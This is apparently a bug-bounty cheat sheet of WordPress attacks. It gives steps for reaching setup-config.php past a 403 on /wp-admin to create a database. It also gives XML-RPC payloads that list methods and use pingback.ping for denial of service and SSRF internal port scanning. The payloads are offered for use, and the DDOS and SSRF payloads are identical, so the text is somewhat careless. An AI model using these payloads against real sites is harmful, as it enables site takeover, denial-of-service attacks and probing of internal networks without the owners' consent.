## 1. Create database
``` 
/wp-admin with 403 status 
Bypass it using /wp-admin/setup-config.php?step=1
This will allow you to create a database
```

## 2. xmlrpc.php

This is one of the common issue on wordpress. To get some bucks with this misconfiguration you must have to exploit it fully, and have to show the impact properly as well.

## Detection
* visit site.com/xmlrpc.php
* Get the error message about POST request only
## Exploit
* Intercept the request and change the method GET to POST
* List all Methods
```
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
* Check the pingback.ping mentod is there or not
* Perform DDOS
```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
* Perform SSRF (Internal PORT scan only)
```
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
